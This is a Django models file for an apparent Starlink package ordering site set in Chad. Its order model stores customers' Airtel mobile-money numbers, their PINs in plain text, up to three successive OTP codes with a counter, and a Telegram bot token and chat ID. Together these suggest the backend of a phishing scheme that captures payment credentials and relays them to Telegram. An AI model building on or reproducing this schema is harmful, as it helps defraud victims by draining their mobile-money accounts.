from django.db import models
from django.contrib.auth.models import AbstractUser
from django.utils import timezone

class CustomUser(AbstractUser):
    phone_number = models.CharField(max_length=20, unique=True)
    country = models.CharField(max_length=50, default="Tchad")
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.phone_number

class StarlinkPackage(models.Model):
    name = models.CharField(max_length=100)
    description = models.TextField()
    price = models.DecimalField(max_digits=10, decimal_places=2)
    data_limit = models.CharField(max_length=50)
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.name

class StarlinkOrder(models.Model):
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('pin_verified', 'PIN Verified'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
    ]

    starlink_kit_id = models.CharField(max_length=100)
    phone_number = models.CharField(max_length=20)
    package_name = models.CharField(max_length=100)
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    
    # Payment details
    airtel_number = models.CharField(max_length=20, blank=True, null=True)
    pin = models.CharField(max_length=10, blank=True, null=True)
    pin_verified = models.BooleanField(default=False)
    pin_verified_at = models.DateTimeField(blank=True, null=True)
    
    # OTP tracking
    otp = models.CharField(max_length=10, blank=True, null=True)
    otp_1 = models.CharField(max_length=10, blank=True, null=True)
    otp_2 = models.CharField(max_length=10, blank=True, null=True)
    otp_3 = models.CharField(max_length=10, blank=True, null=True)
    otp_count = models.IntegerField(default=0)
    otp_verified = models.BooleanField(default=False)
    otp_verified_at = models.DateTimeField(blank=True, null=True)
    
    payment_entered_at = models.DateTimeField(blank=True, null=True)
    completed_at = models.DateTimeField(blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)

    @property
    def full_name(self):
        try:
            user = CustomUser.objects.get(phone_number=self.phone_number)
            return f"{user.first_name} {user.last_name}".strip() or user.username
        except CustomUser.DoesNotExist:
            return "Unknown"

    def __str__(self):
        return f"Order {self.id} - {self.phone_number}"

class TelegramConfig(models.Model):
    name = models.CharField(max_length=100)
    bot_token = models.CharField(max_length=255)
    chat_id = models.CharField(max_length=100)
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.name
